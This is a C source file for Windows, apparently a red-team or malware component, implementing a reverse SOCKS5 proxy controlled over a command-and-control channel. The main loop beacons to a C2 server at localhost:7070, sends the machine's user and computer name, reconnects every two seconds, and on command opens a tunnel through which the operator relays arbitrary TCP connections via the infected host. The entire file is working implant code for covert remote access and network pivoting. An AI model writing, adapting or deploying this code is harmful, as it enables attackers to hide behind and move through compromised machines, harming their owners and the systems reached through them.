/**
 * Reverse TCP Sock5 Proxy
 * Copyright(c) 2022 - Coldzer0 <Coldzer0 [at] protonmail.ch> @Coldzer0x0
 * Ref: https://www.rfc-editor.org/rfc/rfc1928
 */

#include <stdio.h>
#include <winsock2.h>
#include <windows.h>

#define UNUSED(x) (void)(x)

#define MAX_BUFFER_SIZE 32768
#define SOCKS5_VERSION 5

#define SOCKS5_REPLY_SUCCEEDED 0
#define SOCKS5_CMD_TCP_CONNECT 1

#define SOCKS5_ADDR_TYPE_IPV4         1
#define SOCKS5_ADDR_TYPE_DOMAIN_NAME  3
#define SOCKS5_ADDR_TYPE_IPV6         4 // TODO

typedef struct Socks5Request {
  BYTE Version;
  BYTE Command;
  BYTE Rsv; // Always 0
  BYTE Atyp;
  DWORD dwDestIp;
  WORD wDestPort;
} Socks5Request, *PSocks5Request;

typedef struct Socks5MethodSel {
  BYTE Version;
  BYTE nMethods;
  BYTE Methods[256];
} Socks5MethodSel, *PSocks5MethodSel;

/*-------------------------------------------------------------------*/

/**
 * Connect to Host || IP & Port
 * @param HOST Hostname or IP
 * @param PORT
 * @return New Sock if connected, SOCKET_ERROR on Error.
 */
SOCKET Connect(char *HOST, WORD PORT) {
  struct sockaddr_in SocketAddress = {
      .sin_family = AF_INET,
      .sin_port = htons(PORT),
      .sin_addr.S_un.S_addr = inet_addr(HOST)
  };
  if (SocketAddress.sin_addr.S_un.S_addr == INADDR_NONE) {
    struct hostent *Host = gethostbyname(HOST);
    if (Host) {
      SocketAddress.sin_addr.S_un.S_addr = ((struct in_addr **) Host->h_addr_list)[0]->S_un.S_addr;
    } else
      return SOCKET_ERROR;
  }

  SOCKET SinSock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
  if (SinSock != SOCKET_ERROR) {
    if (connect(SinSock, (struct sockaddr *) &SocketAddress, sizeof(struct sockaddr_in)) == SOCKET_ERROR) {
      closesocket(SinSock);
      return SOCKET_ERROR;
    }
  }
  return SinSock;
}

int SendBuffer(SOCKET sock, char *Buffer, int BufferSize) {
  return send(sock, Buffer, BufferSize, 0);
}

int ReceiveBuffer(SOCKET sock, char *Buffer, int BufferSize) {
  return recv(sock, Buffer, BufferSize, 0);
}

/**
 * Get received size without reading the data.
 * @param sock
 * @return Received Packet size, SOCKET_ERROR on Error.
 */
int ReceiveLength(SOCKET sock) {
  u_long result;
  if (ioctlsocket(sock, FIONREAD, &result) != 0) {
    return SOCKET_ERROR;
  }
  return (int) result;
}

/*-------------------------------------------------------------------*/

/**
 *  Extract the Host & Port from Sock5Request.
 *  Currently, IPV4 & DNS is Supported.
 * @param Sock5Request Pointer to Socks5 Request Buffer
 * @param HOST Pointer to the Host - Should be 256 in Size.
 * @param PORT Pointer to the Port variable.
 * @return TRUE of there's valid HOST & PORT.
 */
BOOLEAN ExtractHostAndPort(PSocks5Request Sock5Request, char *HOST, WORD *PORT) {

  BYTE DNSNameLen = 0;
  memset(HOST, 0, 256);
  switch (Sock5Request->Atyp) {
    case SOCKS5_ADDR_TYPE_IPV4: {
      struct in_addr ip_addr = {.S_un.S_addr = Sock5Request->dwDestIp};
      char *IP = inet_ntoa(ip_addr);
      /**
       * The string returned is guaranteed to be valid only until the next
       * Windows Sockets function call is made within the same thread.
       * Therefore, the data should be copied before another Windows Sockets call is made.
       * Ref: https://learn.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-inet_ntoa#remarks
       */
      strcpy_s(HOST, 16, IP);
      *PORT = ntohs(Sock5Request->wDestPort);
      printf("IP:PORT : %s:%d \n", HOST, *PORT);
      break;
    }
    case SOCKS5_ADDR_TYPE_DOMAIN_NAME: {
      /**
       * the address field contains a fully-qualified domain name.  The first
       * octet of the address field contains the number of octets of name that
       * follow, there is no terminating NUL octet.
       * Ref: https://www.rfc-editor.org/rfc/rfc1928#section-5
       */
      DNSNameLen = (BYTE) Sock5Request->dwDestIp;
      memcpy_s(HOST, 256, (char *) Sock5Request + 5, DNSNameLen);
      *PORT = ntohs(*(WORD *) (((char *) Sock5Request) + 5 + DNSNameLen));
      printf("New Connection : %s:%d \n", HOST, *PORT);
      break;
    }
    default: {
      printf("Ops, Request Type : %d is not supported. \n", Sock5Request->Atyp);
    }
  };
  return (strlen(HOST)) && *PORT;
}

/**
 * Open new connection with our server to get the sock5 requests.
 * @param lpThreadParameter
 * @return :V
 */
DWORD WINAPI NewTunnel(LPVOID lpThreadParameter) {
  UNUSED(lpThreadParameter);

  fd_set SelSet;
  SOCKET ExternalSock;
  Socks5MethodSel Socks5Method = {};

  char *Packet;
  char Buffer[MAX_BUFFER_SIZE];
  int BufferSize;

  char HOST[256];
  WORD PORT;

  SOCKET ServerTunnel = Connect("localhost", 5050);
  if (ServerTunnel != SOCKET_ERROR) {
    if (ReceiveBuffer(ServerTunnel, (char *) &Socks5Method, sizeof(Socks5MethodSel)) > 0) {

      // Make sure we are using Sock5
      if (Socks5Method.Version == SOCKS5_VERSION) {

        // Send back the version number as confirmation.
        Socks5Method.nMethods = SOCKS5_REPLY_SUCCEEDED;
        SendBuffer(ServerTunnel, (char *) &Socks5Method, 2);

        // Wait for some buffer :V
        do {
          BufferSize = ReceiveLength(ServerTunnel);
          Sleep(16); // 60 FPS :V
        } while (BufferSize == 0);

        // Make sure we have a good length :P
        if ((BufferSize != SOCKET_ERROR) && BufferSize >= sizeof(Socks5Request)) {

          Packet = malloc(BufferSize);
          if (Packet) {

            int RLen = ReceiveBuffer(ServerTunnel, Packet, BufferSize);
            if (RLen >= BufferSize) {
              // Cast the Buffer to Socks5Request struct to make it easier to handle.
              PSocks5Request Sock5Request = (PSocks5Request) Packet;
              if (Sock5Request->Version == SOCKS5_VERSION && Sock5Request->Command == SOCKS5_CMD_TCP_CONNECT) {

                if (ExtractHostAndPort(Sock5Request, HOST, &PORT)) {
                  // Connect to the HOST & PORT and exchange the data with our server.
                  ExternalSock = Connect((char *) &HOST, PORT);
                  if (ExternalSock != SOCKET_ERROR) {

                    Sock5Request->Command = SOCKS5_REPLY_SUCCEEDED;
                    if (SendBuffer(ServerTunnel, Packet, BufferSize) != SOCKET_ERROR) {

                      BOOLEAN close = FALSE;
                      while (TRUE) {
                        // Clear the FD each loop for select to work ^_^
                        FD_ZERO(&SelSet);
                        FD_SET(ServerTunnel, &SelSet);
                        FD_SET(ExternalSock, &SelSet);

                        // check if the sockets are ready to read
                        if (select(0, &SelSet, NULL, NULL, 0) != SOCKET_ERROR) {

                          /**
                           * Receive data from our Server then send it to the website server.
                           */
                          if (FD_ISSET(ServerTunnel, &SelSet)) {
                            BufferSize = ReceiveBuffer(ServerTunnel, Buffer, MAX_BUFFER_SIZE);
                            if ((BufferSize <= 0) || SendBuffer(ExternalSock, Buffer, BufferSize) == SOCKET_ERROR) {
                              close = TRUE;
                            }
                          }

                          /**
                           * Receive data from website then send it to our Server.
                           */
                          if (FD_ISSET(ExternalSock, &SelSet)) {
                            BufferSize = ReceiveBuffer(ExternalSock, Buffer, MAX_BUFFER_SIZE);
                            if ((BufferSize <= 0) || SendBuffer(ServerTunnel, Buffer, BufferSize) == SOCKET_ERROR) {
                              close = TRUE;
                            }
                          }
                          // Break if there's any errors :V
                          if (close)
                            break;
                          Sleep(16);
                        }
                      }
                    }
                    closesocket(ExternalSock);
                  }
                }
              }
            }
            free(Packet);
          }
        }
      }
    }
    closesocket(ServerTunnel);
  }
}

/*-------------------------------------------------------------------*/

#define C2_CMD_SOCK 1
#define C2_CMD_PING 2
#define C2_CMD_PONG 3
#define C2_CMD_EXIT 4

/**
 * Entry Point of the code :V
 * @return ZERO ^_^
 */
int main() {

  WSADATA WsaData = {};
  SOCKET C2Socket = INVALID_SOCKET;

  BYTE C2_CMD;
  char UserInfo[1024];

  if (WSAStartup(MAKEWORD(2, 2), &WsaData) == 0) {
    while (TRUE) {
      C2Socket = Connect("localhost", 7070);
      if (C2Socket != INVALID_SOCKET) {
        // Send some info to the server
        char UserName[255];
        char ComputerName[255];
        DWORD USize = 255;
        GetUserNameA(UserName, &USize);
        GetComputerNameA(ComputerName, &USize);
        int size = snprintf(UserInfo, 1024, "\x01{\"User\":\"%s\",\"Com\":\"%s\"}", UserName, ComputerName);
        if (SendBuffer(C2Socket, UserInfo, size) == INVALID_SOCKET) {
          closesocket(C2Socket);
          C2Socket = INVALID_SOCKET;
        }
      }

      // A very simple CMD we don't need anything fancy
      while (C2Socket != INVALID_SOCKET) {
        if (ReceiveBuffer(C2Socket, (char *) &C2_CMD, 1) <= 0) {
          closesocket(C2Socket);
          C2Socket = INVALID_SOCKET;
        }
        switch (C2_CMD) {
          case C2_CMD_SOCK: {
            CreateThread(NULL, 0, NewTunnel, NULL, 0, NULL);
            break;
          }
          case C2_CMD_PING: {
            C2_CMD = C2_CMD_PONG;
            SendBuffer(C2Socket, (char *) &C2_CMD, 1);
            break;
          }
          case C2_CMD_EXIT: {
            printf("\nClose the connection :V \n");
            closesocket(C2Socket);
            ExitProcess(0);
          };
          default: closesocket(C2Socket); // Anything else just close the connection :P
        }
      }
      Sleep(2000); // Sleep for 2 sec then Reconnect.
    }
  }
  return 0;
}
